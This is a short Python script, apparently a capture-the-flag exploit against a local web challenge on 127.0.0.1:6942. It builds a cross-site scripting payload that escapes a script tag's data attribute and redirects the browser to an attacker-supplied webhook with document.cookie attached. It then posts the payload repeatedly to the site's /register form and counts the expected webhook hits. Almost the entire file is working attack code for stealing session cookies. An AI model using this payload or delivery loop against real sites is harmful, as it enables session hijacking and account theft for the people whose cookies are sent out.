import requests as r 
import time
url = input("Add you webhook URL\n")

data= {
    "email":"hellobozo@gmail.com",
    "essay":""
}
data['essay']="""<script id='debug' src="/static/js/thing.js" data-iloveumass="hi');document.location=
'"""+url+"""?value='%2Bdocument.cookie;//"></script>"""
print(data['essay'])
#or whatever ip ur hosting this on
counter = 0
for i in range(1,10):
    r1 = r.get("http://127.0.0.1:6942")
    if(i%5==0):
        time.sleep(.2)
        r1=r.post("http://127.0.0.1:6942/register",data=data)
        counter = counter+1
        print(r1.text)

print(f"Expecting {counter} webhook hits")